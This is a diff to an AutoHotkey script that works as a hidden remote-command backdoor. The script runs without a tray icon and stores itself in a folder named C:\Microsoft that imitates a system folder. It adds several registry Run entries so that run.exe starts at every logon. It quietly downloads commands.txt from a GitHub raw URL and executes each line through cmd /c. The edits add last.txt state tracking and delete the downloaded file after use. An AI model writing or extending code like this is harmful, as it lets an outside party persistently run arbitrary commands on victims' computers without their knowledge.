@@ -2,7 +2,6 @@
 #NoTrayIcon
 
 path := "C:\Microsoft"
-last := ""
 
 runAllExes() {
     static lastRun := 0
@@ -13,7 +12,6 @@ runAllExes() {
     }
 
     global path
-    global last
 
     if !DirExist(path)
         DirCreate(path)
@@ -31,15 +29,21 @@ runAllExes() {
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate8"
     RegWrite '"C:\Microsoft\run.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate9"
 
+    last := ""
+    try {
+        last := FileRead(path "\last.txt")
+    } catch {
+    }
     output := path "\commands.txt"
     url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
     command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
     RunWait command, , "Hide"
     text := FileRead(output)
+    FileDelete output
     if (last != text) {
         MsgBox last "`n----------------`n" text
-        last := text
-        MsgBox last "`n----------------`n" text
+        FileDelete "C:\Microsoft\last.txt"
+        FileAppend text, "C:\Microsoft\last.txt"
         lines := StrSplit(Trim(text), "`n")
         for index, line in lines {
             newCommand := 'cmd /c ' line
